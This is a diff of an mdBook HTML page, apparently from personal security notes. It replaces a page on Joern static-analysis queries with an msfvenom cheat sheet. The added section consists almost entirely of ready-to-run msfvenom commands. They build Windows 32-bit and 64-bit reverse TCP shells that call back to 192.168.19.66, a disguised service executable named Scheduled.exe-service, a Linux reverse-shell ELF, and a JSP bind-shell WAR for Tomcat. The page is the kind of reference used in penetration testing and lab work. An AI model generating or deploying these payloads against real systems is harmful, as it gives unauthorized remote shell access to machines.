@@ -3,7 +3,7 @@
     <head>
         <!-- Book generated using mdBook -->
         <meta charset="UTF-8">
-        <title>./joern_badstrlen.md</title>
+        <title>./msfvenom.md</title>
                 
 
         <!-- Custom HTML head -->
@@ -82,7 +82,7 @@
 
         <nav id="sidebar" class="sidebar" aria-label="Table of contents">
             <div class="sidebar-scrollbox">
-                <ol class="chapter"><li class="chapter-item expanded affix "><a href="android.html">./android.md</a></li><li class="chapter-item expanded affix "><a href="angr.html">./angr.md</a></li><li class="chapter-item expanded affix "><a href="arch.html">./arch.md</a></li><li class="chapter-item expanded affix "><a href="bash.html">./bash.md</a></li><li class="chapter-item expanded affix "><a href="git.html">./git.md</a></li><li class="chapter-item expanded affix "><a href="joern_badstrlen.html" class="active">./joern_badstrlen.md</a></li><li class="chapter-item expanded affix "><a href="libvirt_qemu_vagrant.html">./libvirt_qemu_vagrant.md</a></li><li class="chapter-item expanded affix "><a href="msfvenom.html">./msfvenom.md</a></li><li class="chapter-item expanded affix "><a href="old_stuff.html">./old_stuff.md</a></li><li class="chapter-item expanded affix "><a href="podman.html">./podman.md</a></li><li class="chapter-item expanded affix "><a href="pwn.html">./pwn.md</a></li><li class="chapter-item expanded affix "><a href="ruby.html">./ruby.md</a></li><li class="chapter-item expanded affix "><a href="rust.html">./rust.md</a></li><li class="chapter-item expanded affix "><a href="ssh.html">./ssh.md</a></li><li class="chapter-item expanded affix "><a href="windows.html">./windows.md</a></li><li class="chapter-item expanded affix "><a href="wireguard.html">./wireguard.md</a></li><li class="chapter-item expanded affix "><a href="wireguard_with_hop.html">./wireguard_with_hop.md</a></li><li class="chapter-item expanded affix "><a href="z3py.html">./z3py.md</a></li></ol>            </div>
+                <ol class="chapter"><li class="chapter-item expanded affix "><a href="android.html">./android.md</a></li><li class="chapter-item expanded affix "><a href="angr.html">./angr.md</a></li><li class="chapter-item expanded affix "><a href="arch.html">./arch.md</a></li><li class="chapter-item expanded affix "><a href="bash.html">./bash.md</a></li><li class="chapter-item expanded affix "><a href="git.html">./git.md</a></li><li class="chapter-item expanded affix "><a href="joern_badstrlen.html">./joern_badstrlen.md</a></li><li class="chapter-item expanded affix "><a href="libvirt_qemu_vagrant.html">./libvirt_qemu_vagrant.md</a></li><li class="chapter-item expanded affix "><a href="msfvenom.html" class="active">./msfvenom.md</a></li><li class="chapter-item expanded affix "><a href="old_stuff.html">./old_stuff.md</a></li><li class="chapter-item expanded affix "><a href="podman.html">./podman.md</a></li><li class="chapter-item expanded affix "><a href="pwn.html">./pwn.md</a></li><li class="chapter-item expanded affix "><a href="ruby.html">./ruby.md</a></li><li class="chapter-item expanded affix "><a href="rust.html">./rust.md</a></li><li class="chapter-item expanded affix "><a href="ssh.html">./ssh.md</a></li><li class="chapter-item expanded affix "><a href="windows.html">./windows.md</a></li><li class="chapter-item expanded affix "><a href="wireguard.html">./wireguard.md</a></li><li class="chapter-item expanded affix "><a href="wireguard_with_hop.html">./wireguard_with_hop.md</a></li><li class="chapter-item expanded affix "><a href="z3py.html">./z3py.md</a></li></ol>            </div>
             <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
         </nav>
 
@@ -143,59 +143,29 @@
 
                 <div id="content" class="content">
                     <main>
-                        <pre><code>joern&gt; var bad_strlen = ({cpg.method
-         .name(&quot;(?i)strlen&quot;)
-         .callIn
-         .inAssignment
-         .target
-         .evalType(&quot;(g?)int&quot;)}).filter { c =&gt; c.lineNumber == Some(1385) }
+                        <h1 id="msfvenom"><a class="header" href="#msfvenom">msfvenom</a></h1>
+<h3 id="windows-32bit"><a class="header" href="#windows-32bit">windows 32bit</a></h3>
+<pre><code class="language-bash">msfvenom -p windows/shell_reverse_tcp LHOST=192.168.19.66 LPORT=1337 -b &quot;\x00\x04\x58\x9d\xad\xe7\x0a\x0d&quot; -f python
 </code></pre>
-<h1 id="using-reachableby--reachablebyflows"><a class="header" href="#using-reachableby--reachablebyflows">using <code>reachableBy</code> &amp; <code>reachableByFlows</code></a></h1>
-<pre><code class="language-c">// $ cat test/test.c
-#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
-
-int getNumber() {
-    int number = atoi(&quot;8&quot;);
-    number = number + 10;
-    return number;
-}
-
-void *scenario1(int x) {
-    void *p = malloc(x);
-    return p;
-}
-
-void *scenario2(int y) {
-    int z = 10;
-    void *p = malloc(y * z);
-    return p;
-}
-
-void *scenario3() {
-    int a = getNumber();
-    void *p = malloc(a);
-    return p;
-}
+<h3 id="windows-64bit---executable"><a class="header" href="#windows-64bit---executable">windows 64bit - executable</a></h3>
+<pre><code class="language-bash">msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.19.66 LPORT=443 -f exe-service -o Scheduled.exe-service
 </code></pre>
-<pre><code>~/bin/joern/joern-cli/joern
-joern&gt; importCode(inputPath = &quot;test&quot;)
-joern&gt; run.ossdataflow
-joern&gt; def sink = cpg.method.callOut.name(&quot;malloc&quot;).argument
-joern&gt; def source = cpg.method.name(&quot;atoi&quot;).methodReturn
-joern&gt; sink.reachableBy(source).p
-joern&gt; sink.reachableByFlows(source).p
+<h3 id="linux-64bit---executable"><a class="header" href="#linux-64bit---executable">linux 64bit - executable</a></h3>
+<pre><code class="language-bash">msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.19.66 LPORT=4080 -f elf -o rce
+</code></pre>
+<h3 id="java-classic-tomcat-war-file"><a class="header" href="#java-classic-tomcat-war-file">java classic tomcat <code>*.war</code> file</a></h3>
+<pre><code class="language-bash">msfvenom -p java/jsp_shell_bind_tcp LPORT=60001 -f war &gt; shell.war
 </code></pre>
 
                     </main>
 
                     <nav class="nav-wrapper" aria-label="Page navigation">
                         <!-- Mobile navigation buttons -->
-                                                    <a rel="prev" href="git.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                                    <a rel="prev" href="libvirt_qemu_vagrant.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                 <i class="fa fa-angle-left"></i>
                             </a>
                         
-                                                    <a rel="next" href="libvirt_qemu_vagrant.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                                    <a rel="next" href="old_stuff.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                 <i class="fa fa-angle-right"></i>
                             </a>
                         
@@ -205,11 +175,11 @@ joern&gt; sink.reachableByFlows(source).p
             </div>
 
             <nav class="nav-wide-wrapper" aria-label="Page navigation">
-                                    <a rel="prev" href="git.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                    <a rel="prev" href="libvirt_qemu_vagrant.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                         <i class="fa fa-angle-left"></i>
                     </a>
                 
-                                    <a rel="next" href="libvirt_qemu_vagrant.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                    <a rel="next" href="old_stuff.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                         <i class="fa fa-angle-right"></i>
                     </a>
                             </nav>
